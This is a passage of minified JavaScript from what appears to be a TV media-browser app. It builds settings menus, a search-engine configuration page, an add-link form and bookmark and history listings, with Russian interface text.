maJor.sQual)m.push({"title":maJor.params.getInfo('quality',i),"playlist_url":"about:settings#set:quality:"+i});ch.push({"title":"_FPKachVideo_","description":maJor.params.getInfo('quality'),logo:"file_download","template":tmpl_box,"position":"html","playlist_url":"menu","menu":m});if(maJor.platform().match(/maple|mag|dune/))var maxr=1;else if(maJor.platform().match(/lg/))maxr=4;else maxr=3;m=[];for(var i=0;i<maxr;i++)m.push({"title":shint(i,"a"),"playlist_url":"about:settings#set:audioplayer:"+i});ch.push({"title":"_FPAudioMini_ _FPpleer_","description":shint(maJor.params.get('audioplayer'),"a"),logo:"volume_up","template":tmpl_box,"position":"html","playlist_url":"menu","menu":m});m=[{"title":shint(20),"playlist_url":"about:settings#set:pip:0"},{"title":shint(21),"playlist_url":"about:settings#set:pip:1"},{"title":shint(22),"playlist_url":"about:settings#set:pip:2"},{"title":shint(13),"playlist_url":"about:settings#set:pip:3"}];ch.push({"title":"PIP","description":shint(20+parseInt(maJor.params.get('pip'))),logo:"picture_in_picture","template":tmpl_box,"position":"html","playlist_url":"menu","menu":m});m=[];for(var i in sNext)m.push({"title":sNext[i],"playlist_url":"about:settings#set:next:"+i});ch.push({"br":1,"title":"_FPRezhim_ повтора","description":sNext[maJor.params.get('next')],logo:"repeat","template":tmpl_box,"position":"html","playlist_url":"menu","menu":m});m=[{"title":shint(10),"playlist_url":"about:settings#set:sortiptv:0"},{"title":shint(11),"playlist_url":"about:settings#set:sortiptv:1"},{"title":shint(12),"playlist_url":"about:settings#set:sortiptv:2"}];ch.push({"title":"_FPSorting_ IPTV","description":shint(10+parseInt(maJor.params.get('sortiptv'))),logo:"sort","template":tmpl_box,"position":"html","playlist_url":"menu","menu":m});if(maJor.read("ordered"))ch.push({"title":maJor.flength("ordered"),"description":"_FPClear sorted manually_ ",logo:"data_usage","template":tmpl_box,"position":"html","playlist_url":"about:settings#clear:ordered"});m=[];for(var i=20;i<=60;i+=10)m.push({"title":i+" sec","playlist_url":"about:settings#set:timeoutiptv:"+i});ch.push({"title":"Parser timeout","description":maJor.params.get('timeoutiptv')+"sec",logo:"timer","template":tmpl_box,"position":"html","playlist_url":"menu","menu":m});m=[{"title":"Off","playlist_url":"about:settings#set:ads:0"},{"title":"On","playlist_url":"about:settings#set:ads:1"},{"title":"Always","playlist_url":"about:settings#set:ads:2"}];ch.push({"title":"Ads","description":maJor.params.getName.ads[maJor.params.get('ads')],logo:"ads_click","template":tmpl_box,"position":"html","playlist_url":"menu","menu":m});m=[{"title":shint(0),"playlist_url":"about:settings#set:headers:0"},{"title":shint(1),"playlist_url":"about:settings#set:headers:1"}];ch.push({"br":1,"before":"<div class='settile'>_FPNetwork_</div>","title":"_FPSend_ _FPheaders_","description":shint(maJor.params.get("headers")),logo:"send","template":tmpl_box,"position":"html","playlist_url":"menu","menu":m});m=[{"title":shint(50),"playlist_url":"about:settings#set:serv:"}];var x=0;for(var i in uHelper.rCurl){if(maJor.timestamp>2)m.push({"title":"cURL "+(x+1),"playlist_url":"about:settings#set:serv:"+x});x++}
m.push({"title":"_FPOtkl._","playlist_url":"about:settings#set:serv:-1"});function stser(a){if(a==-1)var x="_FPOtkl._";else if(a=="")x="_FPAuto_";else x="cURL "+(++a);return x}
ch.push({"title":"CORS page proxy","description":stser(maJor.params.get("serv")),logo:"sync_alt","template":tmpl_box,"position":"html","playlist_url":"menu","menu":m});if(!maJor.params.get("remoteip"))var ds="_FPEnter_ IP:PORT";else ds="_FPManually_ "+maJor.params.get("remoteip");if(maJor.params.get('remote')==2){var dop="("+getip("remoteip")+")"}else dop="";m=[{"title":"_FPDisable_","playlist_url":"about:settings#set:remote:0"},{"title":shint(2),"playlist_url":"about:settings#set:remote:2"},{"title":"_FPThis device_ 127.0.0.1:802"+(maJor.platform()=="android-device"?8:7),"playlist_url":"about:settings#set:remoteip:127.0.0.1:8027"},{"title":ds,"search_on":"Remotefork _FPEnter_ IP:PORT","search_title":"Порт RemoteFork PC версии :8027, Андроид :8028","value":maJor.params.get("remoteip"),"regex":"^(?:\\s*|(\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3})(:\\d{1,5}))$","type":"remote","error":"Error! Enter IP:PORT","playlist_url":"about:settings#set:remoteip:manual"}];ch.push({"title":"LOCAL_IP Remote&DLNA","description":maJor.params.getInfo("remote"),logo:"router","template":tmpl_box,"position":"html","playlist_url":"menu","menu":m});var ta={"torrserve":[8090,"TORRSERVE_IP","_ST_settings/torser.png"],"torrserve2":[8090,"TORRSERVE_RESERVE","_ST_settings/torser.png"],"acestream":[6878,"ACE_IP","_ST_settings/ace_stream.png",1]};for(var i in ta){var port=ta[i][0];var ip=maJor.params.get(i)||getip(i)||"";if(ip=="-1")ip="";var m=[{"title":"_FPDetect from_ RemoteFork","playlist_url":"about:settings#set:"+i+":"},{"title":"_FPThis device_ 127.0.0.1:"+port,"playlist_url":"about:settings#set:"+i+":127.0.0.1:"+port},{"title":"_FPEnter_ IP:PORT _FPor_ USER:PASS@IP:PORT _FPor_ пустое значение","value":ip,"regex":"^(?:\\s*|((\\w+):(\\w+)@)?(\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3})(:\\d{1,5}))$","error":"Error! Enter IP:PORT example 127.0.0.1:"+port+" or USER:PASS@IP:PORT","search_on":i+" Enter IP:PORT (Default port :"+port+")","type":i,"playlist_url":"about:settings#set:"+i+":manual"},{"title":"_FPDisable_","playlist_url":"about:settings#set:"+i+":-1"}];ch.push({"br":(ta[i][3]||""),"title":ta[i][1],"description":maJor.params.getInfo(i),"logo_30x30":_img(ta[i][2]),"template":tmpl_box,"position":"html","playlist_url":"menu","menu":m})}
m=[{"title":shint(0),"playlist_url":"about:settings#set:udp:0"},{"title":"_FPEnter_ IP:PORT "+shint(maJor.params.get('udp')),"search_on":"search_on","value":maJor.params.get('udp'),"regex":"^(?:\\s*|(\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3})(:\\d{1,5})?)$","type":"ip","error":"Error! Enter IP:PORT","playlist_url":"about:settings#set:udp:manual"}];ch.push({"title":"_FPUDP-to-HTTP Proxy_","description":shint(maJor.params.get('udp')),"search_on":"IP:PORT UDP-to-HTTP Proxy",logo:"swap_horiz","template":tmpl_box,"position":"html","playlist_url":"menu","menu":m});m=[{"title":"Fork (default)","playlist_url":"about:settings#set:browser:"},{"title":"OTT","playlist_url":"about:settings#set:browser:ott"}];ch.push({"title":"_FPBrowser agent_:","description":maJor.params.get('browser'),logo:"language","template":tmpl_box,"position":"html","playlist_url":"menu","menu":m});m=[];for(var i=75;i<=250;i++)if(i%25==0)m.push({"title":i+"%","playlist_url":"about:settings#set:zoom:"+i});ch.push({"br":1,"before":"<div class='settile'>_FPInterface Setup_</div>","title":"_FPZoom_","description":maJor.params.get('zoom')+"%",logo:"zoom_in","template":tmpl_box,"position":"html","playlist_url":"menu","menu":m});m=[{"title":"_FPHide automatically_","playlist_url":"about:settings#set:panel:0"},{"title":"_FPAlways display_","playlist_url":"about:settings#set:panel:1"}];ch.push({"title":"_FPTabs and toolbar_","description":(maJor.params.get("panel")?"_FPAlways display_":"_FPHide automatically_"),logo:"tab","template":tmpl_box,"position":"html","playlist_url":"menu","menu":m});m=[{"title":shint(0),"playlist_url":"about:settings#set:sidebar:0"},{"title":shint(1),"playlist_url":"about:settings#set:sidebar:1"}];ch.push({"title":"_FPBookmark toolbar_","description":shint(parseInt(maJor.params.get("sidebar"))),logo:"bookmarks","template":tmpl_box,"position":"html","playlist_url":"menu","menu":m});m=[];m.push({"title":"_FPOtkl._","playlist_url":"about:settings#set:pr:0"});for(var i=10;i<=100;i+=10)m.push({"title":i+"%","playlist_url":"about:settings#set:pr:"+i});ch.push({"title":"_FPTransparency in the interface_","description":maJor.params.get('pr')+"%",logo:"opacity","template":tmpl_box,"position":"html","playlist_url":"menu","menu":m});m=[{"title":shint(0,7),"playlist_url":"about:settings#set:scrsaver:0"},{"title":shint(1,7),"playlist_url":"about:settings#set:scrsaver:1"},{"title":shint(2,7),"playlist_url":"about:settings#set:scrsaver:2"}];ch.push({"title":"_FPScreensaver_","description":shint(maJor.params.get('scrsaver'),7),logo:"wallpaper","template":tmpl_box,"position":"html","playlist_url":"menu","menu":m});m=[{"title":shint(0),"playlist_url":"about:settings#set:rate:0"},{"title":shint(1),"playlist_url":"about:settings#set:rate:1"}];ch.push({"br":1,"title":"_FPShow rating_","description":shint(parseInt(maJor.params.get("rate"))),logo:"star_rate","template":tmpl_box,"position":"html","playlist_url":"menu","menu":m});m=[];for(var i in f_font)m.push({"title":"<span style='font-family:"+f_font[i]+"'> "+f_font[i]+"</span> ","playlist_url":"about:settings#set:font:"+f_font[i]});ch.push({"title":"_FPFont_","description":maJor.params.get('font'),logo:"format_size","template":tmpl_box,"position":"html","playlist_url":"menu","menu":m});m=[];for(var i in maJor.f_cols){m.push({"title":"<span style='display:inline-block;padding:0px 5px;border-radius:4px;background:"+maJor.params.get('tile')+";color:"+i+";'>"+maJor.f_cols[i]+"</span>","playlist_url":"about:settings#set:color:"+i})}
ch.push({"title":"_FPCvetText_","description":(maJor.f_cols[maJor.params.get('color')]||maJor.params.get('color')),"logo":"format_color_text","template":tmpl_box,"position":"html","playlist_url":"menu","menu":m});m=[];for(var i in maJor.tilefons){m.push({"title":"<span style='display:inline-block;padding:0px 5px;border-radius:4px;background:"+i+";color:"+maJor.params.get('color')+";'>"+maJor.tilefons[i]+"</span>","playlist_url":"about:settings#set:tile:"+i})}
ch.push({"title":"Цвет плиток","description":(maJor.tilefons[maJor.params.get('tile')]||maJor.params.get('tile')),"logo":"grid_view","template":tmpl_box,"position":"html","playlist_url":"menu","menu":m});m=[];for(var i in maJor.focusfons){m.push({"title":"<span style='display:inline-block;padding:0px 5px;border-radius:4px;background:"+maJor.rgba(i)+";color:"+maJor.params.get('color')+";'>"+maJor.focusfons[i]+"</span>","playlist_url":"about:settings#set:focus:"+i})}
ch.push({"title":"Цвет фокуса","description":(maJor.focusfons[maJor.params.get('focus')]||maJor.params.get('focus')),"logo":"color_lens","template":tmpl_box,"position":"html","playlist_url":"menu","menu":m});m=[{"title":shint(0),"playlist_url":"about:settings#set:tileurl:0"},{"title":shint(1),"playlist_url":"about:settings#set:tileurl:1"}];ch.push({"title":"Отображать адреса в избранном",br:1,"description":shint(parseInt(maJor.params.get("tileurl"))),"logo":"link","template":tmpl_box,"position":"html","playlist_url":"menu","menu":m});var iconheight=[76,55,44,101];m=[];for(var i in iconheight){m.push({"title":"<span style='display:inline-block;padding:0px 5px;border-radius:4px;background:"+maJor.params.get('tileiconheight')+";color:"+i+";'>"+iconheight[i]+"пкс</span>","playlist_url":"about:settings#set:tileiconheight:"+iconheight[i]})}
ch.push({"title":"Высота иконок","description":maJor.params.get('tileiconheight')+"пкс","logo":"photo_size_select_large","template":tmpl_box,"position":"html","playlist_url":"menu","menu":m});var titleheight=[2,1];m=[];for(var i in titleheight){m.push({"title":"<span style='display:inline-block;padding:0px 5px;border-radius:4px;background:"+maJor.params.get('tiletitleheight')+";color:"+i+";'>"+pluralize(titleheight[i],"строк")+"</span>","playlist_url":"about:settings#set:tiletitleheight:"+titleheight[i]})}
ch.push({"title":"Высота названий","description":pluralize(maJor.params.get('tiletitleheight'),"строк"),"logo":"text_fields","template":tmpl_box,"position":"html","playlist_url":"menu","menu":m});m=[{"title":"_FPSelect_...","playlist_url":"https://raw.githubusercontent.com/komivp/appinfodl/main/static/fon/index.php"},{"title":"_FPDefault_","playlist_url":"about:settings#set:fon:"},{"title":"_FPForced without a background_","playlist_url":"about:settings#set:fon:-1"}];ch.push({"title":"_FPFonRisunok_","description":"","logo":"image","template":tmpl_box,"position":"html","playlist_url":"menu","menu":m});ch.push({"br":1,"before":"<div style='text-align:center;'>","after":"</div>","title":"_FPPolnSbrosNastr_","logo_30x30":"none","template":""+tmpl_button+"","position":"html","playlist_url":"about:settings#reset"});var css='@font-face {font-family: \'Material Icons\';src: url(\'http://browser.appfxml.com/library/MaterialIcons-Regular.ttf\') format(\'truetype\');font-weight: normal;font-style: normal;  font-display: swap;}'+'.material-icons {  font-family: \'Material Icons\', sans-serif;  font-weight: normal;  font-style: normal;  font-size: 24px;  line-height: 1;  display: inline-block;  white-space: nowrap;  vertical-align: middle;  *display: inline;  zoom: 1;}'+'.settings-container{background:#121212;padding:10px;overflow:hidden;}'+'.setting-item{'+'float:left;width: 222px;margin: 3px;'+'background:#1f1f1f;'+'border-radius:8px;'+'padding:5px 6px;'+'text-align:center;'+'}'+'.setting-icon{vertical-align: middle;font-size:28px;margin-bottom:2px;float: left;width: 32px;overflow: hidden;}'+'.setting-title{font-weight:bold;font-size:18px;margin-bottom:2px;}'+'.setting-desc{font-size:16px;color:#efedc8;}'+'.settings-clear{clear:both;}';data={"align":"left","all_style":"width:240px;margin:3px;border-radius:8px;","css":css,"icon":"none","typeList":"start","title":"_FPSettings_","before":"<div style='float:right;color:gray;margin-right:15px;font-size:50%;'> "+gV(maJor.loader_platform)+" "+gV(window,"version_client")+" "+gV(window,"is_ver")+" "+maJor.platform()+" "+maJor.screen().w+"x"+maJor.screen().h+" Cors: "+(maJor.app_cors||"No")+" "+(maJor.build?"Android build: "+maJor.build+" sdk "+maJor.sdk:"")+" User ID: "+(!maJor.user?"Нет.":maJor.user.email)+" Device ID: "+vtt+maJor.getId()+"</div><div class='settile' style='padding-left:10px;'>_FPSettings_</div><div class='settings-container'>","after":"<div class='settings-clear'></div></div>","channels":ch};if(n.indexOf("#")>0){gP().channels=ch;gP().renderChannels(getSelect(),"update");return}}else if(n.indexOf("about:configsearch")==0){var x=n.split("#");Il01QllQll().loadPage.lO10111O0001lOl00Ypr=x[0];var data={"navigate":"_FPNastrGlPoisk_","typeList":"start"};if(x.length==2){var se=getVars("start");var ds=-1;for(var i=0;i<se.search.sites.length;i++){if(se.search.sites[i].dop==2)ds=i}
x=x[1].split(":");if(x[0]=="move"){if(se.search[x[1]].length>1){var x1=x[3];if(x[2]=="up"){if(x[3]==0)var x2=se.search[x[1]].length-1;else x2=x1-1}else if(x[2]=="down"){if(x[3]==se.search[x[1]].length-1)var x2=0;else x2=1+1*x1}
if(x[3]==se.search.ds)se.search.ds=x2;else if(x2==se.search.ds)se.search.ds=x[3];oldselect=x2;var tmp=se.search[x[1]][x1];se.search[x[1]][x1]=se.search[x[1]][x2];se.search[x[1]][x2]=tmp}else kjtYpr.inf("Ошибка перемещения! Только один элемент в списке "+x[1],1500)}else if(x[0]=="setDop"){if(x[3]==2&&ds>=0)se.search.sites[ds].dop=1;se.search.sites[x[2]].dop=1*x[3]}else if(x[0]=="delsites"){se.search.sites.splice(parseInt(x[1]),1)}else if(x[0]=="save"){var wr=0;var p="sites";if(gV(pq.input,"egsurl")=="")kjtYpr.inf("Ссылка не может быть пустой!",1800);else if(!String(gV(pq.input,"egsurl")).match(/%s/))kjtYpr.inf("Ссылка должна содержать параметр запроса %s!",1800);else if(!String(gV(pq.input,"egsurl")).match(/^(https?|html):\/\//))kjtYpr.inf("Ссылка должна начинаться с http://, html:// или https:// !",1800);else{if(x[2]=="new"){x[2]=se.search[p].length;se.search[p].push({})}
se.search[p][x[2]].url=gV(pq.input,"egsurl");if(gV(pq.input,"egstitle")=="New search"){var m=String(gV(pq.input,"egsurl")).match(/\/\/(.*?)\//);if(m!=null)pq.input.egstitle=m[1]}
se.search[p][x[2]].title=gV(pq.input,"egstitle");se.search[p][x[2]].logo=gV(pq.input,"egslogo");if(gV(pq.input,"egsenabled")==2&&ds>=0)se.search.sites[ds].dop=1;se.search[p][x[2]].dop=1*gV(pq.input,"egsenabled");se.search[p][x[2]].type="";kjtYpr.inf("Установлен URL "+pq.input.egsurl,1500);wr=1}
if(!wr)return}else if(x[0]=="edit"){Il01QllQll().loadPage.lO10111O0001lOl00Ypr=n;var ttl="Редактировать";if(gV(x,2)=="new"){ttl="Добавить";if(typeof pq.elCh["new"]=="object")var t=pq.elCh["new"];else t={"title":"New search","logo":"","url":""};var enabled=1;var dop="включено дополнительно"}else{t=se.search.sites[x[2]];if(t){if(se.search.ds==x[2]||t.dop==2){enabled=2;dop="<span style='color:green;font-weight:bold;'>включено по умолчанию </span>"}else if(t.dop){enabled=1;dop="включено дополнительно"}else{enabled=0;dop="<span style='color:red;'>отключено</span>"}}}
var mn=[{"title":"Включить по умолчанию","playlist_url":"payd_egsenabled","value":"2"},{"title":"Включить дополнительно","playlist_url":"payd_egsenabled","value":"1"},{"title":"Отключить ","playlist_url":"payd_egsenabled","value":"0"}];var data={"align":"left","all_after":"<div style='margin:5px;clear: both;'></div>","all_template":'<div style="text-align:left;width:900px;height:25px; font-size: 24px;word-break: break-all;  margin: 4px; border-radius: 5px;     padding: 5px 16px 6px 6px;    color: #111;    background: rgb(232, 240, 254);">$title</div>',"navigate":"_FPNastrGlPoisk_","typeList":"start","before":"<div style='text-align:left;margin:3px 20px;'><b>"+ttl+" поисковую систему</b></div>","title":t.title,"navigate":"Редатирование "+t.title,"channels":[{"before":"<div style='margin-left: 30px;    text-align: left;    font-size: 30px;    float: left;    width: 300px;'>Название</div>","type":"replace","title":""+t.title,"playlist_url":"payd_egstitle","value":t.title,"search_on":"Название","position":"html"},{"br":1,"type":"replace","before":"<div style='margin-left: 30px;    text-align: left;    font-size: 30px;    float: left;    width: 300px;'>Иконка<div style='text-align:left;font-size: 17px;'> необязательно</div></div>","title":String(t.logo),"logo_30x30":t.logo,"playlist_url":"payd_egslogo","value":t.logo,"search_on":"Иконка (необязательно)","position":"html"},{"br":1,"type":"replace","before":"<div style='margin-left: 30px;    text-align: left;    font-size: 30px;    float: left;    width: 300px;'>URL<div style='text-align:left;font-size: 17px;'>должен быть c параметром %s вместо запроса</div></div>","title":""+t.url,"presearch":"http://spider.appfxml.com/omnibox/?type=historysearch","typepresearch":"%s","description":tmpl_info.replace("info","Укажите URL c параметром %s вместо запроса"),"playlist_url":"payd_egsurl","value":t.url,"search_on":"URL c параметром %s вместо запроса","position":"html"},{"br":1,"type":"select","before":"<div style='margin-left: 30px;text-align: left;font-size: 30px;float: left;width: 300px;'>_FPUse in search_</div>","title":dop,"value":enabled,"template":"<div style='font-size: 24px;margin: 4px;    border-radius: 5px;    padding: 5px;    color: #111;    background: rgb(232, 240, 254);'>$title &#9660;</div>","position":"html","playlist_url":"payd_egsenabled","menu":mn},{"br":1,"before":"<span style='margin:30px 10px 0px 450px;'></span>","after":" ","title":"_FPSave_","template":tmpl_button,"playlist_url":"about:configsearch#save:sites:"+x[2],"logo_30x30":"","position":"html"},{"br":0,"before":"<span style='margin:30px;'></span>","after":" ","playlist_url":"confirm","confirm":["about:configsearch"],"title":(gV(x,2)=="new"?"_FPYour search engines_":"_FPCancel_"),"description":"_FPOpen_ _FPYour search engines_?","template":tmpl_button,"logo_30x30":"","position":"html"}]};if(gV(x,2)!="new"){data.channels.push({"br":0,"before":"<span style='margin:30px;'></span>","playlist_url":"confirm","confirm":["about:configsearch#delsites:"+x[2]],"title":"_FPDelete_","description":"_FPDelete_?","template":tmpl_button,"logo_30x30":"","position":"html"})}
return data}else if(x[0]=="setdefault"){delete se.search;setVars("start",se);se=getVars("start")}
setVars("start",se);data.defaultSelect=oldselect;se=se.search}else se=getVars("start").search;data["chan"+"nels"]=[];data.before="<div style='text-align:left;margin:3px 20px;'><b>Поисковая система по умолчанию </b><div style='text-align:left;font-size: 18px;'> Список формируется из вашей истории посещений сайтов с поисковыми формами и добавленных вручную</div></div>";data.align="left";try{var typ="sites";for(var i=0;i<se[typ].length;i++){var mn=[{"title":"Использовать по умолчанию","playlist_url":"about:configsearch#setDop:sites:"+i+":2"},{"title":"Использовать дополнительно","playlist_url":"about:configsearch#setDop:sites:"+i+":1"},{"title":"Отключить ","playlist_url":"about:configsearch#setDop:sites:"+i+":0"},{"title":"Изменить","playlist_url":"about:configsearch#edit:"+typ+":"+i},{"title":"Передвинуть вверх","playlist_url":"about:configsearch#move:"+typ+":up:"+i},{"title":"Передвинуть вниз","playlist_url":"about:configsearch#move:"+typ+":down:"+i}];if(se[typ][i].dop==2)var dop="<span style='color:green;font-weight:bold;'>по умолчанию </span>";else if(se[typ][i].dop)dop="дополнительно";else{dop="<span style='color:red;'>отключено</span>"}
mn.push({"title":"Удалить","playlist_url":"about:configsearch#del"+typ+":"+i});data["chan"+"nels"].push({"logo_30x30":se[typ][i].logo,"position":"html","br":1,"title":se[typ][i].title,"playlist_url":"menu","menu":mn,"template":"<div style='text-align:left;margin:0px 30px;font-size:25px;float:left;width: 450px;   overflow: hidden;'><img src='$logo_30x30' onerror='this.style.visibility=\"hidden\";' style='height:20px;margin-top: 5px; margin-right: 5px;    float: left;' />"+"$title</div><div style='font-size:18px;margin-left:30px;float:left;width:150px;'>"+dop+"</div><div style='font-size:18px;margin-left:20px;float:left;width:60px;'>&nbsp;"+se[typ][i].type+"</div><div style='font-size:16px;color:#f2ebb6;margin-left:30px;float:left;    padding-top: 4px;    width: 450px;    overflow: hidden;    height: 20px;'>"+se[typ][i].url+"</div>","description":tmpl_info.replace("info",se[typ][i].url)})}
data["chan"+"nels"].push({"logo_30x30":"none","before":"<div style='margin: 30px;'>","title":"Добавить поисковик","position":"html","br":1,"template":tmpl_button,"playlist_url":"about:configsearch#edit:sites:new"});data["chan"+"nels"].push({"logo_30x30":"none","title":"Сбросить настройки поисковых систем","position":"html","br":0,"playlist_url":"confirm","confirm":["about:configsearch#setdefault"],"after":"</div>","template":tmpl_button});data["chan"+"nels"][data["chan"+"nels"].length-1].after+="<div style='font-size:18px;margin:30px;font-style: italic;'><span style='color:green;'>По умолчанию </span> - Это ваша поисковая система по умолчанию в адресной строке и на начальной странице.<br>"+"Дополнительно - поиск будет вестись также по этим сайтам Iframe - сайт ищет по нескольким вложенным в нем страницам (ифреймах) Site - одна страница с ответом на ваш запрос</div>"}catch(e){kjtYpr.popUp("Err listed searches:<br>"+e.message,2000)}}else if(n.indexOf("about:addstartlink")==0){if(n=="about:addstartlinkok"){if(gV(pq.input,"sturl")=="")kjtYpr.inf("Ссылка не может быть пустой!",1800);else{if(gV(pq.input,"sttitle")=="")var title=String(gV(pq.input,"sturl")).match(/(.*\/\/)?(.{0,20})(\?)?/)[2];else title=gV(pq.input,"sttitle");favarray={"title":title,"playlist_url":pq.input.sturl};ContextMenu.play("cmdToStart");return gotoStart()}}
var data={"title":"Добавить ссылку","all_style":"border-radius: 12px;width: 600px;","channels":[]};data.channels.push({"title":"Заголовок (не обязательно)","value":gV(pq.input,"sttitle"),"playlist_url":"payd_sttitle","search_on":"Введите заголовок","position":"html","logo":"<img style=\"width: 24px; height: 24px; vertical-align: middle;\" src=\""+_img("_ST_folder-pen.png")+"\">","before":"<div style=\"margin: 20px auto; padding: 20px; width: 600px; background: linear-gradient(135deg, #3b3f52 0%, #2a2e3f 100%); border-radius: 12px;  text-align: center;\"><h2 style=\"font-size: 26px; font-weight: 600; color: #e0e0e0; margin: 0 0 10px 0;\">Добавить новую ссылку</h2><p style=\"font-size: 17px; color: #a0aec0; margin-bottom: 8px;\">Введите заголовок и URL для добавления плейлиста. Поддерживаемые форматы ссылок: FXML JSON, XML, M3U, xspf, TXT. Для веб (html5) приложений добавьте префикс html:// в начало ссылки</p>","template":"<div style=\"margin: 3px; padding: 15px;background: #1f2535; border-radius: 8px; overflow: hidden;\"><div style=\"float: left; width: 40px; text-align: center; line-height: 24px;\">$logo</div><div style=\"margin-left: 50px;\"><div style=\"font-size: 18px; font-weight: 600; color: #e0e0e0; margin-bottom: 5px;\">$title</div></div><div style=\"clear: both;\"></div></div>"});data.channels.push({"br":1,"title":"URL ссылки","value":gV(pq.input,"sturl"),"playlist_url":"payd_sturl","search_on":"Введите URL ссылки","position":"html","logo":"<img style=\"width: 24px; height: 24px; vertical-align: middle;\" src=\""+_img("_ST_link.png")+"\">","presearch":"http://spider.appfxml.com/omnibox/?type=all","template":"<div style=\"margin: 3px; padding: 15px; background: #1f2535; border-radius: 8px; overflow: hidden;\"><div style=\"float: left; width: 40px; text-align: center; line-height: 24px;\">$logo</div><div style=\"margin-left: 50px;\"><div style=\"font-size: 18px; font-weight: 600; color: #e0e0e0; margin-bottom: 5px;\">$title</div></div><div style=\"clear: both;\"></div></div>"});data.channels.push({"br":1,"title":"Добавить","playlist_url":"about:addstartlinkok","position":"html","logo":"<img style=\"width: 24px; height: 24px; vertical-align: middle;\" src=\""+_img("_ST_check.png")+"\">","after":"</div>","template":"<div style=\"margin: 3px; padding: 15px; background: #2d3445; border-radius: 8px;text-align: center;\"><div style=\"float: left; width: 40px; text-align: center; line-height: 24px;\">$logo</div><div style=\"margin-left: 50px; font-size: 18px; font-weight: 600; color: #e0e0e0; line-height: 24px;\">$title</div><div style=\"clear: both;\"></div></div>"});data.icon="none";data.typeList="start";data.navigate="Добавить новый сайт в Стартовое меню"}else if(n=="about:favorites"){s=maJor.read("bookmarks");var dopch=[];if(s!=""){var sd=lIlI1VBOOlI01QYpr(s);if(sd!=null){dopch=sd}}
var data={"title":"_FPZakladki_","icon":_img("_ST_zakl.png"),"typeList":"start","navigate":"Закладки та історія","css":".title { font-size: 17px; font-weight: 600; margin-bottom: 1px;vertical-align: middle;} .desc { font-size: 12px; color: #a0aec0; text-overflow: ellipsis; overflow: hidden; } img { height: 24px; vertical-align: middle; }","all_style":"width: 100%;  border-radius: 8px; ","all_template":"<div style=\"margin: 3px; padding: 5px 15px; border-radius: 6px; background: #1f2535;\"><div style=\"float: left; width: 40px; text-align: center; line-height: 24px;\"><img src=\"$logo_30x30\"></div><div style=\"margin-left: 50px;\" class=\"item\"><div class=\"title\">$title</div><div class=\"desc\">$description</div></div><div style=\"clear: both;\"></div></div>","before":"<div style=\"margin: 20px auto; padding: 20px; width: 680px; background: #2a2e3f; border-radius: 12px; text-align: center;\" class=\"item\"><h2 style=\"font-size: 22px; font-weight: 600; margin: 0 0 10px 0;\">Мои закладки и история</h2><p style=\"font-size: 14px; color: #a0aec0; margin-bottom: 20px;\">Управляйте вашими закладками, историей поисков и кешем</p>",after:"</div>","channels":[]};for(var i=0;i<dopch.length;i++){var logo=typeof dopch[i].logo_30x30!=="undefined"?dopch[i].logo_30x30:"_ST_zakl.png";data.channels.push({"title":dopch[i].title,"playlist_url":dopch[i].playlist_url,"type":gVs(dopch[i],"type"),"logo_30x30":_img(logo),"description":"","position":"html","br":1})}
data.channels.push({"title":"Добавить папку","playlist_url":"bookmarksadd","logo_30x30":_img("_ST_plus.png"),"description":"","position":"html","br":1});if(maJor.read("zakladki.xml")!=""){data.channels.push({"title":maJor.params.get("zakladki.xml"),"playlist_url":"zakladki.xml","logo_30x30":_img("_ST_zakl.png"),"description":"","position":"html","br":1})}
if(maJor.read("zakladkiSerials.xml")!=""){data.channels.push({"title":maJor.params.get("zakladkiSerials.xml"),"playlist_url":"zakladkiSerials.xml","logo_30x30":_img("_ST_zakl.png"),"description":"","position":"html","br":1})}
if(maJor.read("zakladkiFilms.xml")!=""){data.channels.push({"title":maJor.params.get("zakladkiFilms.xml"),"playlist_url":"zakladkiFilms.xml","logo_30x30":_img("_ST_zakl.png"),"description":"","position":"html","br":1})}
if(maJor.read("zakladkiIPTV.xml")!=""){data.channels.push({"title":maJor.params.get("zakladkiIPTV.xml"),"playlist_url":"zakladkiIPTV.xml","logo_30x30":_img("_ST_zakl.png"),"description":"","position":"html","br":1})}
data.channels.push({"title":"_FPMy_ _FPVneshnie_ _FPzakladki_ "+(!maJor.user?"(Необходимо войти в аккаунт)":"("+maJor.user.login+")"),"playlist_url":"http://cloudflare.appfxml.com/browseraccount/?do=list","logo_30x30":_img("_ST_zakl.png"),"description":"","position":"html","br":1});data.channels.push({"title":"История поисков","playlist_url":"about:histsearch","logo_30x30":_img("_ST_history.png"),"description":"","position":"html","br":1});data.channels.push({"title":"История вводов URL","playlist_url":"about:histurl","logo_30x30":_img("_ST_history.png"),"description":"","position":"html","br":1});data.channels.push({"title":"_FPHistory_ ("+maJor.flength("history")+")","playlist_url":"about:history","logo_30x30":_img("_ST_history.png"),"description":"История последних просмотров и посещений на этом устройстве","position":"html","br":1});data.channels.push({"title":"История посещений моих устройств "+(!maJor.user?"(Необходимо войти в аккаунт)":"("+maJor.user.login+")"),"playlist_url":"http://cloudflare.appfxml.com/browseraccount/?do=history","onclick":"autouserexport()","logo_30x30":_img("_ST_history.png"),"description":"","position":"html","br":1});data.channels.push({"title":"Кеш и Сохраненные страницы ("+maJor.flength("prev_cache")+")","playlist_url":"about:cache","logo_30x30":_img("_ST_fcache.png"),"description":"В кеш сохраняются страницы открытые со стартового меню или внутренних/внешних закладок. Эти страницы хранятся локально на вашем устройстве","position":"html","br":1,"after":"</div>"})}else if(n.indexOf("about:histsearch")==0){data={"playlist_name":"История поисков","channels":[]};for(var a in maJor.enteresObj){var el=maJor.enteresObj[a];if(!el.n.match(rUrl))
data.channels.push({"title":el.n,"playlist_url":"http://spider.appfxml.com/search?search="+el.n,"logo_30x30":_img("_ST_history.png"),"description":"Нажмите для поиска в Spider"})}}else if(n.indexOf("about:histurl")==0){data={"playlist_name":"История ввода адресов","channels":[]};var x=maJor.read("enteres").split("|");for(var a in maJor.enteresObj){var el=maJor.enteresObj[a];if(el.n.match(rUrl))
